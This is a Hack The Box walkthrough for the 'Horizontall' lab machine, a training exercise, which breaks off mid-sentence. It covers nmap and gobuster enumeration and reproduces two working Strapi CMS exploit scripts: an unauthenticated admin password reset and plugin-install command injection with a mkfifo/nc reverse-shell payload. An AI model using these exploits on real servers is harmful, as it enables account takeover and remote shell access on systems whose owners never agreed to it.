---
title: Hack The Box&#58; Horizontall
permalink: /HTB/Horizontall
layout: default
---

Horizontall is an easy level box on HackTheBox and was quite the difficult box for me to solve. It felt way more difficult than all the other easy boxes I have done until this
point. I had to use techniques I haven't done yet, such as port forwarding, virtual host enumeration, and chaining CVE's.
# Walkthrough
I started off with a quick nmap scan on all ports `nmap -p- <ip>` just to see what is running and I got these results
```markdown
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-03 19:46 EDT
Nmap scan report for 10.10.11.105
Host is up (0.083s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.71 seconds
```
So now I'm going to do a deeper scan on those running services by running the command `nmap -sC -sV -A -p 22,80 <ip>` and I get these results
```markdown
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-03 19:50 EDT
Nmap scan report for 10.10.11.105
Host is up (0.076s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   81.02 ms 10.10.14.1
2   75.35 ms 10.10.11.105

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.16 seconds
```
Nothing really sticks out to me except the domain under the port 80 scan so I'm just going to try to access the web server on port 80. I'm going to add the domain to my `/etc/hosts` file first so I can actually access it, because, based on this scan, the domain wasn't accessible yet. Just run the command `nano /etc/hosts` as root and add `<ip> horizontall.htb` to it.

![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/horizontall.PNG?raw=true) 
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/horizontall%20(1).PNG?raw=true) 
Now nothing really stuck out to me when I actually accessed the website. There was an input box but the submission button did nothing. I tried enumerating some directories with gobuster and those didn't give me any significant findings. So now I'm going to try to search for any subdomains using gobuster. I ran
`gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u horizontall.htb` and I got the result
```markdown
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://horizontall.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/09/03 20:03:54 Starting gobuster in VHOST enumeration mode
===============================================================
Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
                                                         
===============================================================
2021/09/04 00:16:24 Finished
===============================================================
```
So now we see a subdomain. Lets access it by first adding the domain and the ip address into the `/etc/hosts` file like we did with the domain `horizontall.htb`. 
<br />
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/horizontall%20(2).PNG?raw=true) 
<br />
After accessing, it's pretty much empty so I'm gonna go ahead and enumerate some directories using `gobuster dir -w /usr/share/wordlists/dirb/big.txt -u api-prod.horizontall.htb`. The gobuster scan gives me these results
```markdown
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/04 02:03:12 Starting gobuster in directory enumeration mode
===============================================================
/ADMIN                (Status: 200) [Size: 854]
/Admin                (Status: 200) [Size: 854]
/admin                (Status: 200) [Size: 854]
/favicon.ico          (Status: 200) [Size: 1150]
/reviews              (Status: 200) [Size: 507] 
/robots.txt           (Status: 200) [Size: 121] 
/secci�               (Status: 400) [Size: 69]  
/users                (Status: 403) [Size: 60]  
                                                
===============================================================
2021/09/04 02:06:00 Finished
===============================================================
```
The admin page looks pretty interesting, so I'm gonna check it out. 
<br />
![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/horizontall%20(3).PNG?raw=true) 
<br />
It's running something called strapi, so lets see if theres some existing exploits or CVE's for this thing. A quick google search lands me this <a href="https://www.exploit-db.com/exploits/50239">exploitdb</a> code for CVE-2019-18818 + CVE-2019-19609:
```markdown
# Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 2021-08-30
# Exploit Author: Musyoka Ian
# Vendor Homepage: https://strapi.io/
# Software Link: https://strapi.io/
# Version: Strapi CMS version 3.0.0-beta.17.4 or lower
# Tested on: Ubuntu 20.04
# CVE : CVE-2019-18818, CVE-2019-19609

#!/usr/bin/env python3

import requests
import json
from cmd import Cmd
import sys

if len(sys.argv) != 2:
    print("[-] Wrong number of arguments provided")
    print("[*] Usage: python3 exploit.py <URL>\n")
    sys.exit()


class Terminal(Cmd):
    prompt = "$> "
    def default(self, args):
        code_exec(args)

def check_version():
    global url
    print("[+] Checking Strapi CMS Version running")
    version = requests.get(f"{url}/admin/init").text
    version = json.loads(version)
    version = version["data"]["strapiVersion"]
    if version == "3.0.0-beta.17.4":
        print("[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n")
    else:
        print("[-] Version mismatch trying the exploit anyway")


def password_reset():
    global url, jwt
    session = requests.session()
    params = {"code" : {"$gt":0},
            "password" : "SuperStrongPassword1",
            "passwordConfirmation" : "SuperStrongPassword1"
            }
    output = session.post(f"{url}/admin/auth/reset-password", json = params).text
    response = json.loads(output)
    jwt = response["jwt"]
    username = response["user"]["username"]
    email = response["user"]["email"]

    if "jwt" not in output:
        print("[-] Password reset unsuccessfull\n[-] Exiting now\n\n")
        sys.exit(1)
    else:
        print(f"[+] Password reset was successfully\n[+] Your email is: {email}\n[+] Your new credentials are: {username}:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: {jwt}\n\n")
def code_exec(cmd):
    global jwt, url
    print("[+] Triggering Remote code executin\n[*] Rember this is a blind RCE don't expect to see output")
    headers = {"Authorization" : f"Bearer {jwt}"}
    data = {"plugin" : f"documentation && $({cmd})",
            "port" : "1337"}
    out = requests.post(f"{url}/admin/plugins/install", json = data, headers = headers)
    print(out.text)

if __name__ == ("__main__"):
    url = sys.argv[1]
    if url.endswith("/"):
        url = url[:-1]
    check_version()
    password_reset()
    terminal = Terminal()
    terminal.cmdloop()
            
```
After downloading it, I make the file executable and I run the script with the command: `python3 exploit3.py http://api-prod.horizontall.htb`
```markdown
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwNzM2MzQwLCJleHAiOjE2MzMzMjgzNDB9.UiR8OMmTl31-u8kBO-MXWtzZulZA8bczLNEW9Q69TGs
```
So now I can login to the site, I have a JSON Token, and I have a web shell. Normally I would see what I could enumerate from the site but I found another some <a href="https://github.com/dasithsv/CVE-2019-19609"> Github code </a> that utilizes my jwt to gain a reverse shell. The codes reads as: 
```markdown
#!/bin/python

# Product: Strapi Framework
# Version Affected: strapi-3.0.0-beta.17.7 and earlier
# Fix PR: https://github.com/strapi/strapi/pull/4636
# NPM Advisory: https://www.npmjs.com/advisories/1424
# more information https://bittherapy.net/post/strapi-framework-remote-code-execution/

import requests
import sys

print("\n\n\nStrapi Framework Vulnerable to Remote Code Execution - CVE-2019-19609")
print("please set up a listener on port 9001 before running the script. you will get a shell to that listener\n")

if len(sys.argv) ==5:
    rhost = sys.argv[1]
    lhost = sys.argv[2]
    jwt = sys.argv[3]
    url = sys.argv[4]+'admin/plugins/install'

    headers = {
        'Host': rhost,
        'Authorization': 'Bearer '+jwt,
        'Content-Type': 'application/json',
        'Content-Length': '131',
        'Connection': 'close',
    }

    data = '{ "plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+lhost+' 9001 >/tmp/f)", "port":"80" }'
    response = requests.post(url, headers=headers, data=data, verify=False)

else:
    print('python3 exploit.py <rhost> <lhost> <jwt> <url>')
 ```
 According to the code and documentation, I have to set up a listener on port 9001 before I run this so I open another terminal window and run `nc -nvlp 9001`. I copy the code into a `.py` file, make it executable, and run it with `
 
